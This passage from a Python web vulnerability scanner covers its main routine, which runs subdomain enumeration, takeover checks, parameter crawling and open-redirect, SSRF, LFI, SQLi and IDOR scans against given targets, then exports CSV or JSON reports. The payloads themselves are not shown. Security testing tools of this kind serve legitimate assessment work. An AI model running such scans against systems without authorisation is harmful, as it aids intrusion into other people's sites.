            print(f"  {colored('🔴 Critical:', 'red')} {stats['Critical']}")
            print(f"  {colored('🟡 Medium:', 'yellow')} {stats['Medium']}")
            print(f"  {colored('🟢 Low:', 'green')} {stats['Low']}")
            any_printed_results = True
        else:
            print(colored("\n🚫 No open redirect vulnerabilities found.", "green", attrs=["bold"]))
            any_printed_results = True

    if not any_printed_results:
        print(colored("\n🚫 No relevant results to display for the selected options.", "yellow", attrs=["bold"]))

def run_parallel_tasks(initial_targets, args, debug=False):
    new_subdomains_found = []
    unique_domains_for_initial_tasks = set()
    for target in initial_targets:
        parsed = urllib.parse.urlparse(target)
        domain = parsed.netloc or parsed.path
        if domain:
            unique_domains_for_initial_tasks.add(domain)

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_to_task = {}
        for domain_to_scan in unique_domains_for_initial_tasks:
            if args.subdomains:
                future_to_task[executor.submit(get_subdomains, domain_to_scan, debug)] = ("sub", domain_to_scan)
            if args.takeover:
                future_to_task[executor.submit(check_subdomain_takeover, domain_to_scan, debug, args.timeout)] = ("takeover", domain_to_scan)
            if args.auto_params:
                found_for_url = next((t for t in initial_targets if domain_to_scan in t), domain_to_scan)
                future_to_task[executor.submit(
                    lambda d_scan, o_target: [o_target, extract_params(crawl_urls(d_scan, debug)), args.timeout] if crawl_urls(d_scan, debug) else None,
                    domain_to_scan, found_for_url
                )] = ("params", found_for_url)

        for future in as_completed(future_to_task):
            task_type, original_identifier = future_to_task[future]
            try:
                result = future.result()
                if result:
                    if task_type == "sub":
                        new_subdomains_found.extend([s for s in result if s.startswith(("http://", "https://"))])
                    elif task_type == "takeover":
                        with takeover_lock:
                            takeover_results.append(result)
                        print_ui_message(f"Subdomain Takeover detected for: {result['domain']} ({result['takeover']})", prefix="⚠️", color="red", attrs=["bold"], is_silent=args.silent)
                    elif task_type == "params":
                        if result[1]:
                            with params_lock:
                                param_results.append(result)
                            print_ui_message(f"Found parameters for {result[0]}: {', '.join(result[1])}", prefix="🔍", color="blue", attrs=["bold"], is_silent=args.silent)
            except Exception as e:
                logging.error(colored(f"⚠️ Error in {task_type} task for {original_identifier}: {e}", "magenta", attrs=["bold"]))
                if debug:
                    logging.debug(colored(f"Task {task_type} failed for {original_identifier}: {e}", "magenta"))

    return list(set(new_subdomains_found))

# Custom ArgumentParser to show banner with -h
class CustomArgumentParser(argparse.ArgumentParser):
    def print_help(self, file=None):
        display_banner()
        super().print_help(file)

def main():
    parser = CustomArgumentParser(
        description="📊 Open Redirect Scanner by Jass",
        epilog="Responsible hacking ~Jass",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("-u", "--url", help="Single URL or domain (e.g., example.com)")
    parser.add_argument("-f", "--file", help="File with list of URLs or domains (e.g., urls.txt)")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of concurrent tasks")
    parser.add_argument("-ex", "--export", choices=["csv", "json"], help="Export results to CSV or JSON")
    parser.add_argument("-c", "--clean", action="store_true", help="Clean file to only valid HTTP/HTTPS targets")
    parser.add_argument("-sub", "--subdomains", action="store_true", help="Enable subdomain enumeration")
    parser.add_argument("-tr", "--takeover", action="store_true", help="Enable subdomain takeover check")
    parser.add_argument("-sr", "--scan-redirect", action="store_true", help="Enable open redirect scan")
    parser.add_argument("-ci", "--csp-iframe", action="store_true", help="Enable CSP and IFRAME/OAuth checks")
    parser.add_argument("-ap", "--auto-params", action="store_true", help="Enable auto-detection of parameters")
    parser.add_argument("-all", "--full-coverage", action="store_true", help="Enable all scans (redirect, subdomains, takeover, CSP/IFRAME, auto-params, additional vulns)")
    parser.add_argument("-d", "--debug", action="store_true", help="Enable debug logging")
    parser.add_argument("--silent", action="store_true", help="Run in silent mode, only show final summary")
    parser.add_argument("--scheme", choices=["http", "https", "both"], default="https", help="Specify URL scheme for scanning")
    parser.add_argument("--timeout", type=int, default=15, help="Set HTTP request timeout in seconds")
    parser.add_argument("--filter-severity", type=str, help="Filter summary by severity (e.g., 'critical,medium')")
    parser.add_argument("--sort-by", choices=["severity", "url", "param"], default="severity", help="Sort results by severity, url, or param")
    parser.add_argument("--enable-reflect", action="store_true", help="Enable reflected parameter detection")
    parser.add_argument("--enable-ssrf", action="store_true", help="Enable SSRF detection")
    parser.add_argument("--enable-lfi", action="store_true", help="Enable LFI/RFI detection")
    parser.add_argument("--enable-sqli", action="store_true", help="Enable SQLi detection")
    parser.add_argument("--enable-idor", action="store_true", help="Enable IDOR detection")

    args = parser.parse_args()

    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)

    global HTTP_SEMAPHORE, BROWSER_SEMAPHORE
    HTTP_SEMAPHORE = asyncio.Semaphore(args.threads * 4)
    BROWSER_SEMAPHORE = asyncio.Semaphore(max(1, args.threads // 2))

    if not any([args.url, args.file]):
        display_banner()
        parser.print_help()
        sys.exit(1)

    initial_targets = []
    if args.file:
        lines = process_file(args.file, args.debug)
        processed_lines = []
        for line in lines:
            parsed = urllib.parse.urlparse(line)
            if not parsed.scheme:
                if args.scheme == "https":
                    processed_lines.append(f"https://{line}")
                elif args.scheme == "http":
                    processed_lines.append(f"http://{line}")
                elif args.scheme == "both":
                    processed_lines.append(f"http://{line}")
                    processed_lines.append(f"https://{line}")
            else:
                processed_lines.append(line)
        initial_targets.extend(list(set(processed_lines)))

        if args.clean:
            initial_targets = [l for l in initial_targets if l.startswith(("http://", "https://"))]
            print_ui_message(f"Cleaned: {len(initial_targets)} valid targets from file", prefix="🧹", color="blue", attrs=["bold"], is_silent=args.silent)
    
    if args.url:
        target_url = args.url
        parsed = urllib.parse.urlparse(target_url)
        if not parsed.scheme:
            if args.scheme == "https":
                initial_targets.append(f"https://{target_url}")
            elif args.scheme == "http":
                initial_targets.append(f"http://{target_url}")
            elif args.scheme == "both":
                initial_targets.append(f"http://{target_url}")
                initial_targets.append(f"https://{target_url}")
        else:
            initial_targets.append(target_url)
    
    initial_targets = list(set(initial_targets))

    if not initial_targets:
        parser.print_help()
        sys.exit(1)

    display_banner()
    print(colored("┌" + "─" * 50 + "┐", "cyan"))
    print_ui_message(f"Starting scan for {len(initial_targets)} initial targets...", prefix="🔍", color="cyan", attrs=["bold"], is_silent=args.silent)
    if args.full_coverage:
        print_ui_message(f"Full Coverage Mode: Enabled", prefix="🚀", color="magenta", attrs=["bold"], is_silent=args.silent)
        args.subdomains = True
        args.takeover = True
        args.scan_redirect = True
        args.csp_iframe = True
        args.auto_params = True
        args.enable_reflect = True
        args.enable_ssrf = True
        args.enable_lfi = True
        args.enable_sqli = True
        args.enable_idor = True
    else:
        if not (args.subdomains or args.takeover or args.scan_redirect or args.csp_iframe or args.auto_params or args.enable_reflect or args.enable_ssrf or args.enable_lfi or args.enable_sqli or args.enable_idor):
            args.scan_redirect = True
            print_ui_message(f"No specific scan type selected. Defaulting to Open Redirect Scan.", prefix="ℹ️", color="magenta", attrs=["bold"], is_silent=args.silent)

    if args.scan_redirect:
        print_ui_message(f"Default Params: {', '.join(default_params)}", prefix="🛠", color="magenta", attrs=["bold"], is_silent=args.silent)
        print_ui_message(f"Default Payloads: {', '.join(default_payloads)}", prefix="🎯", color="magenta", attrs=["bold"], is_silent=args.silent)
    if args.subdomains:
        print_ui_message(f"Subdomain enumeration: Enabled", prefix="🌐", color="magenta", attrs=["bold"], is_silent=args.silent)
    if args.takeover:
        print_ui_message(f"Subdomain takeover check: Enabled", prefix="⚠️", color="magenta", attrs=["bold"], is_silent=args.silent)
    if args.csp_iframe:
        print_ui_message(f"CSP/IFRAME check: Enabled", prefix="🔍", color="magenta", attrs=["bold"], is_silent=args.silent)
    if args.auto_params:
        print_ui_message(f"Auto parameter detection: Enabled", prefix="🔍", color="magenta", attrs=["bold"], is_silent=args.silent)
    if args.enable_reflect:
        print_ui_message(f"Reflected Parameter Detection: Enabled", prefix="🔍", color="magenta", attrs=["bold"], is_silent=args.silent)
    if args.enable_ssrf:
        print_ui_message(f"SSRF Detection: Enabled", prefix="🔍", color="magenta", attrs=["bold"], is_silent=args.silent)
    if args.enable_lfi:
        print_ui_message(f"LFI/RFI Detection: Enabled", prefix="🔍", color="magenta", attrs=["bold"], is_silent=args.silent)
    if args.enable_sqli:
        print_ui_message(f"SQLi Detection: Enabled", prefix="🔍", color="magenta", attrs=["bold"], is_silent=args.silent)
    if args.enable_idor:
        print_ui_message(f"IDOR Detection: Enabled", prefix="🔍", color="magenta", attrs=["bold"], is_silent=args.silent)
    if args.debug:
        print_ui_message(f"Debug mode: Enabled", prefix="🐞", color="magenta", attrs=["bold"], is_silent=args.silent)
    print(colored("└" + "─" * 50 + "┘", "cyan"))

    all_targets_for_scans = list(set(initial_targets))

    if args.subdomains or args.takeover or args.auto_params:
        print(colored("┌" + "=" * 50 + "┐", "cyan"))
        print_ui_message("Running initial information gathering...", prefix="⚙️", color="cyan", attrs=["bold"], is_silent=args.silent)
        print(colored("└" + "=" * 50 + "┘", "cyan"))
        newly_discovered_subdomains = run_parallel_tasks(initial_targets, args, args.debug)
        if args.subdomains and newly_discovered_subdomains:
            all_targets_for_scans.extend(newly_discovered_subdomains)
            all_targets_for_scans = list(set(all_targets_for_scans))
            print_ui_message(f"Found {len(newly_discovered_subdomains)} new subdomains.", prefix="🌐", color="cyan", attrs=["bold"], is_silent=args.silent)
            print_ui_message(f"Total targets for main scans: {len(all_targets_for_scans)}", prefix="🔍", color="cyan", attrs=["bold"], is_silent=args.silent)
            print(colored("└" + "─" * 50 + "┘", "cyan"))

    if args.csp_iframe:
        print(colored("┌" + "=" * 50 + "┐", "cyan"))
        print_ui_message("Running CSP/IFRAME checks...", prefix="⚡", color="cyan", attrs=["bold"], is_silent=args.silent)
        print(colored("└" + "=" * 50 + "┘", "cyan"))
        asyncio.run(scan_targets(all_targets_for_scans, [], [], args.threads, csp_iframe_only=True, debug=args.debug, request_timeout=args.timeout, is_silent=args.silent))

    if args.scan_redirect or args.enable_reflect or args.enable_ssrf or args.enable_lfi or args.enable_sqli or args.enable_idor:
        print(colored("┌" + "=" * 50 + "┐", "cyan"))
        print_ui_message("Running Open Redirect and Additional Vulnerability Scans...", prefix="🚀", color="cyan", attrs=["bold"], is_silent=args.silent)
        print(colored("└" + "=" * 50 + "┘", "cyan"))
        
        scan_params_for_redirect = list(default_params)
        if args.auto_params:
            all_detected_params = set()
            for entry in param_results:
                try:
                    _, params, _ = entry
                except ValueError:
                    _, params = entry
                all_detected_params.update(params)
            scan_params_for_redirect.extend(list(all_detected_params))
            scan_params_for_redirect = list(set(scan_params_for_redirect))
        
        targets_for_redirect_scan = [t for t in all_targets_for_scans if urllib.parse.urlparse(t).scheme.startswith("http")]

        if not targets_for_redirect_scan:
            print_ui_message(f"No valid HTTP/HTTPS targets found for scan.", prefix="⚠️", color="yellow", attrs=["bold"], is_silent=args.silent)
        else:
            asyncio.run(scan_targets(targets_for_redirect_scan, scan_params_for_redirect, default_payloads, args.threads,
                                    enable_reflect=args.enable_reflect, enable_ssrf=args.enable_ssrf, enable_lfi=args.enable_lfi,
                                    enable_sqli=args.enable_sqli, enable_idor=args.enable_idor, debug=args.debug,
                                    request_timeout=args.timeout, is_silent=args.silent))

    print_summary(args)

    if args.export == "csv":
        csv_rows = []
        fieldnames = ["Type", "Target", "Param", "Payload", "Vulnerable URL", "Location Header", "Severity", "cURL Confirmed Redirect URL", "cURL Command", "CSP Status", "IFRAME/OAuth Status", "CNAME", "Takeover Status", "Extracted Params", "Response Length"]
        csv_rows.append(fieldnames)

        for entry in vuln_table:
            severity_clean = re.sub(r'\x1b\[[0-9;]*m', '', entry['severity'])
            csp_clean = re.sub(r'\x1b\[[0-9;]*m', '', entry['csp'])
            iframe_oauth_clean = re.sub(r'\x1b\[[0-9;]*m', '', entry['iframe_oauth'])
            row = ["Open Redirect", entry['target'], entry['param'], entry['payload'], entry['vulnerable_url'], 
                   entry['location_header'], severity_clean, entry['curl_confirmed_redirect_url'], entry['curl_command'], 
                   csp_clean, iframe_oauth_clean, "", "", ""]
            csv_rows.append(row)
        
        for entry in csp_iframe_results:
            csp_clean = re.sub(r'\x1b\[[0-9;]*m', '', entry['csp'])
            iframe_oauth_clean = re.sub(r'\x1b\[[0-9;]*m', '', entry['iframe_oauth'])
            row = ["CSP/IFRAME Check", entry['target'], "", "", "", "", "", "", "", csp_clean, iframe_oauth_clean, "", "", ""]
            csv_rows.append(row)

        for entry in takeover_results:
            row = ["Subdomain Takeover", entry["domain"], "", "", "", "", "", "", "", "", entry["cname"], entry["takeover"], ""]
            csv_rows.append(row)

        for entry in param_results:
            try:
                url, params, _ = entry
            except ValueError:
                url, params = entry
            row = ["Extracted Params", url, "", "", "", "", "", "", "", "", "", "", ", ".join(params)]
            csv_rows.append(row)

        for vuln in found_reflections + found_ssrf + found_lfi + found_sqli + found_idor:
            row = [vuln['type'].upper(), vuln['url'], vuln.get('param', ''), vuln.get('payload', ''), 
                   '', '', vuln['severity'], '', '', '', '', '', '']
            if 'length' in vuln:
                row[-1] = str(vuln['length'])
            csv_rows.append(row)

        if len(csv_rows) > 1:
            fname = f"scan_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
            try:
                with open(fname, "w", newline='', encoding='utf-8') as csvfile:
                    writer = csv.writer(csvfile)
                    writer.writerows(csv_rows)
                logging.info(colored(f"📁 Exported all applicable results to {fname}", "blue", attrs=["bold"]))
            except IOError as e:
                logging.error(colored(f"⚠️ Error exporting CSV to {fname}: {e}", "red"))
        else:
            logging.info(colored("ℹ️ No results to export to CSV.", "yellow", attrs=["bold"]))

    elif args.export == "json":
        json_vuln_table = []
        for entry in vuln_table:
            clean_entry = entry.copy()
            clean_entry['severity'] = re.sub(r'\x1b\[[0-9;]*m', '', clean_entry['severity'])
            clean_entry['csp'] = re.sub(r'\x1b\[[0-9;]*m', '', clean_entry['csp'])
            clean_entry['iframe_oauth'] = re.sub(r'\x1b\[[0-9;]*m', '', clean_entry['iframe_oauth'])
            json_vuln_table.append(clean_entry)

        json_csp_iframe_results = []
        for r in csp_iframe_results:
            clean_r = r.copy()
            clean_r['csp'] = re.sub(r'\x1b\[[0-9;]*m', '', clean_r['csp'])
            clean_r['iframe_oauth'] = re.sub(r'\x1b\[[0-9;]*m', '', clean_r['iframe_oauth'])
            json_csp_iframe_results.append(clean_r)

        all_json_data = {
            "open_redirect_vulnerabilities": json_vuln_table,
            "csp_iframe_check_results": json_csp_iframe_results,
            "subdomain_takeover_results": takeover_results,
            "extracted_parameters": [[entry[0], entry[1]] for entry in param_results],
            "discovered_subdomains": list(set([sub for domain in dns_cache for sub in dns_cache[domain]])),
            "reflected_params": found_reflections,
            "ssrf_vulnerabilities": found_ssrf,
            "lfi_vulnerabilities": found_lfi,
            "sqli_vulnerabilities": found_sqli,
            "idor_vulnerabilities": found_idor
        }
        
        all_json_data = {k: v for k, v in all_json_data.items() if v}

        if all_json_data:
            fname = f"scan_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            try:
                with open(fname, "w", encoding='utf-8') as jsonfile:
                    json.dump(all_json_data, jsonfile, indent=2)
                logging.info(colored(f"📁 Exported all applicable results to {fname}", "blue", attrs=["bold"]))
            except IOError as e:
                logging.error(colored(f"⚠️ Error exporting JSON to {fname}: {e}", "red"))
        else:
            logging.info(colored("ℹ️ No results to export to JSON.", "yellow", attrs=["bold"]))

    print(colored("\n┌" + "─" * 50 + "┐", "cyan"))
    print_ui_message(f"Scan Completed! Total execution time: {time.time() - start_time:.2f} seconds", prefix="🎉", color="green", attrs=["bold"])
    print(colored("└" + "─" * 50 + "┘", "cyan"))

if __name__ == "__main__":
    start_time = time.time()
    main()
